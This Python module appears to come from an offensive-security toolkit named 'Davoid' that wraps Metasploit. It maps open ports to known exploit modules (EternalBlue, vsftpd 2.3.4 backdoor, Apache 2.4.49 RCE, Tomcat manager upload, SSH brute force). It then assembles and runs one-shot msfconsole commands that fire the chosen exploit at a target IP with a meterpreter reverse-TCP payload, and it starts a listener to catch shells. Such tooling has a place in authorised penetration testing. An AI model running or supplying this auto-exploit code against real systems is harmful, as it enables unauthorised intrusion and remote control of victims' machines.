import os
import subprocess
import questionary
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx

console = Console()


class MetasploitEngine:
    def __init__(self):
        # Locate msfconsole on the system
        common_paths = [
            "/opt/metasploit-framework/bin/msfconsole",  # Official Omnibus installer
            # Apple Silicon Mac (Homebrew)
            "/opt/homebrew/bin/msfconsole",
            # Intel Mac (Homebrew) / Manual
            "/usr/local/bin/msfconsole",
            "/usr/bin/msfconsole"                       # Kali Linux default
        ]

        self.msf_path = ""

        # 1. First try the standard 'which' command
        try:
            path = subprocess.run(['which', 'msfconsole'],
                                  capture_output=True, text=True).stdout.strip()
            if os.path.exists(path):
                self.msf_path = path
        except:
            pass

        # 2. If 'which' fails (very common under macOS sudo), check absolute paths
        if not self.msf_path:
            for p in common_paths:
                if os.path.exists(p):
                    self.msf_path = p
                    break

    def check_installed(self):
        if not self.msf_path or not os.path.exists(self.msf_path):
            console.print(
                "[bold red][!] Metasploit Framework not found![/bold red]")
            console.print("[yellow]Please install Metasploit: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall[/yellow]")
            return False
        return True

    def interactive_console(self):
        console.print(
            "[bold green][+] Hooking into Interactive Metasploit Console...[/bold green]")
        console.print("[dim]Type 'exit' to return to Davoid.[/dim]\n")
        # Launch MSF directly in the current terminal session
        subprocess.run([self.msf_path])

    def auto_exploit(self):
        # Pull default IPs from Davoid's global context
        default_rhost = ctx.get("RHOST") or "192.168.1.1"
        default_lhost = ctx.get("LHOST") or "127.0.0.1"

        target = questionary.text(
            "Target IP (RHOST):", default=default_rhost, style=Q_STYLE).ask()
        if not target:
            return

        # --- NEW DYNAMIC PORT LOGIC ---
        rport_input = questionary.text(
            "Target Port (RPORT) found on scan:", style=Q_STYLE).ask()
        if not rport_input:
            return

        try:
            rport = int(rport_input)
        except ValueError:
            console.print(
                "[red]Invalid port number. Please enter a number.[/red]")
            return

        lhost = questionary.text(
            "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
        if not lhost:
            return

        # Map common ports to their top Metasploit modules
        port_exploits = {
            21: [
                "exploit/unix/ftp/vsftpd_234_backdoor (vsFTPd 2.3.4)",
                "exploit/unix/ftp/proftpd_133c_backdoor (ProFTPD 1.3.3c)"
            ],
            22: [
                "auxiliary/scanner/ssh/ssh_login (SSH Brute Force)",
                "auxiliary/scanner/ssh/libssh_auth_bypass (libssh Auth Bypass)"
            ],
            80: [
                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
                "exploit/multi/http/apache_normalize_path_rce (Apache 2.4.49 RCE)"
            ],
            443: [
                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
                "exploit/multi/http/apache_normalize_path_rce (Apache 2.4.49 RCE)"
            ],
            139: [
                "exploit/windows/smb/ms17_010_eternalblue (Windows SMB MS17-010)"
            ],
            445: [
                "exploit/windows/smb/ms17_010_eternalblue (Windows SMB MS17-010)",
                "exploit/windows/smb/psexec (PsExec Authenticated)"
            ],
            8080: [
                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
                "exploit/multi/http/tomcat_mgr_upload (Tomcat Manager Upload)"
            ]
        }

        # If the port is in our dictionary, show those options.
        # If not, provide a generic fallback.
        choices = port_exploits.get(rport, [
            "exploit/multi/handler (Generic Listener - Port not specifically mapped)"
        ])

        # Always add the option to search Metasploit manually for this specific port
        search_option = f"Search Metasploit for all exploits on port {rport}..."
        choices.append(search_option)

        module = questionary.select(
            f"Select Exploit Module for Port {rport}:", choices=choices, style=Q_STYLE).ask()

        if not module:
            return

        # Handle the dynamic search fallback
        if module == search_option:
            console.print(
                f"[*] Dropping to MSF to search for port {rport} exploits...")
            # Automatically run the search command inside MSF
            msf_cmd = f"search port:{rport}"
            subprocess.run([self.msf_path, "-q", "-x", msf_cmd])
            return

        # Clean up the module string to just grab the path
        clean_module = module.split()[0]

        # Determine payload based on exploit
        payload = "windows/x64/meterpreter/reverse_tcp"
        if "multi/handler" in clean_module:
            payload = questionary.text("Listener Payload (e.g. linux/x64/meterpreter/reverse_tcp):",
                                       default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
        elif "unix" in clean_module or "ssh" in clean_module or "apache" in clean_module:
            payload = "cmd/unix/interact"

        # Build the automated MSF command
        msf_cmd = f"use {clean_module}; set RHOSTS {target}; set RPORT {rport}; set LHOST {lhost}; set PAYLOAD {payload}; exploit"

        console.print(Panel(
            f"[bold cyan]Deploying Exploit...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {clean_module}", border_style="red"))

        # Run msfconsole silently passing the command array
        subprocess.run([self.msf_path, "-q", "-x", msf_cmd])

    def run(self):
        draw_header("Metasploit Integration Engine")

        if not self.check_installed():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        while True:
            choice = questionary.select("Metasploit Operations:", choices=[
                "1. Auto-Exploit Target (Guided)",
                "2. Multi/Handler Listener (Catch Shells)",
                "3. Interactive MSF Console",
                "Back"
            ], style=Q_STYLE).ask()

            if not choice or choice == "Back":
                break
            elif "Auto-Exploit" in choice:
                self.auto_exploit()
            elif "Handler" in choice:
                lhost = ctx.get("LHOST") or "0.0.0.0"
                lport = questionary.text(
                    "LPORT:", default="4444", style=Q_STYLE).ask()
                payload = questionary.text(
                    "Payload:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
                msf_cmd = f"use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD {payload}; exploit -j"
                subprocess.run([self.msf_path, "-q", "-x", msf_cmd])
            elif "Interactive" in choice:
                self.interactive_console()


def run_msf():
    engine = MetasploitEngine()
    engine.run()
